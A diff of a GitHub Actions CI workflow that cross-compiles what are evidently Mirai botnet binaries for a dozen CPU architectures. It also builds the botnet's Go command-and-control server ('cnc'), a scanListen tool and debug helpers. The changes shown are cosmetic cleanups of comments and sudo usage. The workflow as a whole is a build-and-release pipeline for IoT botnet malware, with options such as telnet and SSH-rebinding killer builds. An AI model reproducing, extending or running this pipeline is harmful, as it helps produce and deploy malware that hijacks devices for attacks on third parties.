@@ -41,53 +41,44 @@ jobs:
             sudo tar -xf "$file"
             sudo rm "$file"
           done
-    
+
           # Clear target directories before moving
-          sudo rm -rf /etc/xcompile/bin/*
-          sudo rm -rf /etc/xcompile/c++/*
-          sudo rm -rf /etc/xcompile/cc/*
-          sudo rm -rf /etc/xcompile/host/*
-          sudo rm -rf /etc/xcompile/include/*
-          sudo rm -rf /etc/xcompile/lib/*
-          sudo rm -rf /etc/xcompile/man/*
-          sudo rm -rf /etc/xcompile/src/*
-          sudo rm -rf /etc/xcompile/tools/*
-      
+          sudo rm -rf /etc/xcompile/*
+
+          # Move extracted cross-compilers
           sudo mv cross-compiler-*/* /etc/xcompile/
           sudo rm -rf cross-compiler-*
-          
+
       - name: Update PATH for cross-compilers
         run: |
-          sudo echo "/etc/xcompile/armv4l/bin" >> $GITHUB_ENV
-          sudo echo "/etc/xcompile/armv5l/bin" >> $GITHUB_ENV
-          sudo echo "/etc/xcompile/armv6l/bin" >> $GITHUB_ENV
-          sudo echo "/etc/xcompile/i586/bin" >> $GITHUB_ENV
-          sudo echo "/etc/xcompile/i686/bin" >> $GITHUB_ENV
-          sudo echo "/etc/xcompile/m68k/bin" >> $GITHUB_ENV
-          sudo echo "/etc/xcompile/mips/bin" >> $GITHUB_ENV
-          sudo echo "/etc/xcompile/mipsel/bin" >> $GITHUB_ENV
-          sudo echo "/etc/xcompile/powerpc/bin" >> $GITHUB_ENV
-          sudo echo "/etc/xcompile/sh4/bin" >> $GITHUB_ENV
-          sudo echo "/etc/xcompile/sparc/bin" >> $GITHUB_ENV
-          sudo echo "/etc/xcompile/x86_64/bin" >> $GITHUB_ENV
+          echo "/etc/xcompile/armv4l/bin" >> $GITHUB_ENV
+          echo "/etc/xcompile/armv5l/bin" >> $GITHUB_ENV
+          echo "/etc/xcompile/armv6l/bin" >> $GITHUB_ENV
+          echo "/etc/xcompile/i586/bin" >> $GITHUB_ENV
+          echo "/etc/xcompile/i686/bin" >> $GITHUB_ENV
+          echo "/etc/xcompile/m68k/bin" >> $GITHUB_ENV
+          echo "/etc/xcompile/mips/bin" >> $GITHUB_ENV
+          echo "/etc/xcompile/mipsel/bin" >> $GITHUB_ENV
+          echo "/etc/xcompile/powerpc/bin" >> $GITHUB_ENV
+          echo "/etc/xcompile/sh4/bin" >> $GITHUB_ENV
+          echo "/etc/xcompile/sparc/bin" >> $GITHUB_ENV
+          echo "/etc/xcompile/x86_64/bin" >> $GITHUB_ENV
 
       - name: Install Go dependencies
         run: |
           cd cnc
           go get github.com/go-sql-driver/mysql
           go get github.com/mattn/go-shellwords
-          go build -o cnc # Build the cnc binary and specify output name
+          go build -o cnc
           cd ..
 
       - name: Compile release
         env:
-          BUILD_MODE: release # Change to 'debug' as needed
-          BUILD_TYPE: telnet # Change to 'ssh' as needed
+          BUILD_MODE: release
+          BUILD_TYPE: telnet
         run: |
-          # Create necessary directories
           mkdir -p release debug
 
-          # Function to compile bot
           compile_bot() {
             echo "Compiling $2"
             ${1}-gcc -std=c99 $3 bot/*.c -O3 -o release/"$2"
@@ -120,21 +111,20 @@ jobs:
             compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static" || true
             compile_bot sh4 mirai.sh4 "$FLAGS -DKILLER_REBIND_SSH -static" || true
 
-            mv cnc/cnc release/ # Corrected path
+            mv cnc/cnc release/
             go build -o release/scanListen tools/scanListen.go
           elif [ "$BUILD_MODE" == "debug" ]; then
             gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -g -o debug/mirai.dbg
             gcc -std=c99 tools/enc.c -g -o debug/enc
             gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
             gcc -std=c99 tools/badbot.c -g -o debug/badbot
-            mv cnc/cnc debug/ # Corrected path
+            mv cnc/cnc debug/
             go build -o debug/scanListen tools/scanListen.go
           else
             echo "Unknown parameter $BUILD_MODE: debug or release required"
             exit 1
           fi
 
-          # List files in the release directory for debugging
           echo "Files in release directory:"
           ls -la release
 
